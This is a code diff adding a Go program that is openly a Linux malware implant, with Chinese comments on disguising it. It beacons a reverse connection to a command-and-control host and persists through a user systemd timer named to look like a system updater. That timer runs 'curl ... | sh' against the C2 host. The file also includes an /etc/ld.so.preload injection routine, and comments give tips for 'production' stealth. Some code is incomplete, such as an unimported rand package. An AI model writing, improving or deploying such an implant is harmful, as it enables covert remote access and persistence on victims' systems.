@@ -1,0 +1,157 @@
+package main
+
+import (
+    "crypto/sha256"
+    "encoding/hex"
+    "fmt"
+    "io"
+    "log"
+    "net"
+    "os"
+    "os/exec"
+    "path/filepath"
+    "strings"
+    "syscall"
+    "time"
+)
+
+const (
+    // 生产环境应从环境变量、文件、DNS TXT、implant config读取
+    c2Host     = "update-check.yourdomain.invalid" // 伪装成合法域名
+    c2Port     = 443                               // https更常见
+    c2Path     = "/s/chk"                          // 伪装路径
+    identifier = "chk-" + "linux-agent"            // 用于自检
+)
+
+func dieIfErr(err error, msg string) {
+    if err != nil {
+        // 生产环境：不打印，silent exit 或写伪装日志
+        os.Exit(1)
+    }
+}
+
+// 极简内存驻留反弹shell（不依赖nc -e）
+func beacon() {
+    for {
+        conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", c2Host, c2Port), 15*time.Second)
+        if err != nil {
+            time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
+            continue
+        }
+        defer conn.Close()
+
+        // 简单协议：先发标识符
+        fmt.Fprintf(conn, "%s\n", identifier)
+
+        // 复制 stdin/stdout/stderr
+        go io.Copy(conn, os.Stdin)
+        go io.Copy(os.Stdout, conn)
+        io.Copy(os.Stderr, conn)
+
+        // 如果连接断开，sleep再重连
+        time.Sleep(10 * time.Second)
+    }
+}
+
+// 伪装成系统服务的systemd持久化（user级别更隐蔽）
+func installSystemdPersistence() bool {
+    unitName := "systemd-updater.timer" // 伪装名
+    unitPath := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user", unitName)
+
+    content := fmt.Sprintf(`[Unit]
+Description=Systemd Periodic Update Checker
+
+[Timer]
+OnBootSec=3min
+OnUnitActiveSec=15min
+Unit=%s.service
+
+[Install]
+WantedBy=timers.target
+`, strings.TrimSuffix(unitName, ".timer"))
+
+    serviceContent := `[Unit]
+Description=Systemd Update Service
+
+[Service]
+ExecStart=/bin/sh -c 'curl -sSf https://%s%s | sh'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=default.target
+`
+
+    // 创建目录
+    os.MkdirAll(filepath.Dir(unitPath), 0700)
+
+    // 写 timer
+    if err := os.WriteFile(unitPath, []byte(content), 0640); err != nil {
+        return false
+    }
+
+    servicePath := strings.Replace(unitPath, ".timer", ".service", 1)
+    if err := os.WriteFile(servicePath, []byte(fmt.Sprintf(serviceContent, c2Host, c2Path)), 0640); err != nil {
+        return false
+    }
+
+    // 启用（user级别）
+    exec.Command("systemctl", "--user", "daemon-reload").Run()
+    exec.Command("systemctl", "--user", "enable", "--now", unitName).Run()
+
+    return true
+}
+
+// ld.so.preload方式（最高隐蔽，但需root）
+func installLdPreload() bool {
+    if os.Geteuid() != 0 {
+        return false
+    }
+
+    preloadPath := "/etc/ld.so.preload"
+    maliciousSo := "/usr/lib/libupdaterchk.so" // 伪装名
+
+    // 假设你已经有.so文件（这里仅演示逻辑）
+    // 实际中：内存加载、从C2下载解密后写盘、或直接ptrace注入等
+
+    f, err := os.OpenFile(preloadPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    if err != nil {
+        return false
+    }
+    defer f.Close()
+
+    fmt.Fprintf(f, "%s\n", maliciousSo)
+    return true
+}
+
+// 极简主逻辑：尝试多种持久化方式，按优先级
+func persist() {
+    attempts := []func() bool{
+        installSystemdPersistence, // 最常用
+        // installProfileD,       // 次选
+        // installSshKey,
+        // installLdPreload,      // 需要root
+    }
+
+    for _, fn := range attempts {
+        if fn() {
+            // 成功一种就够了
+            break
+        }
+        time.Sleep(2 * time.Second)
+    }
+}
+
+func main() {
+    // 自检：避免重复运行（简单方式，可升级为pidfile+hash）
+    if os.Getenv("NO_" + strings.ToUpper(identifier)) != "" {
+        os.Exit(0)
+    }
+    os.Setenv("NO_"+strings.ToUpper(identifier), "1")
+
+    // 尝试持久化
+    go persist()
+
+    // 主循环：beacon
+    beacon()
+}
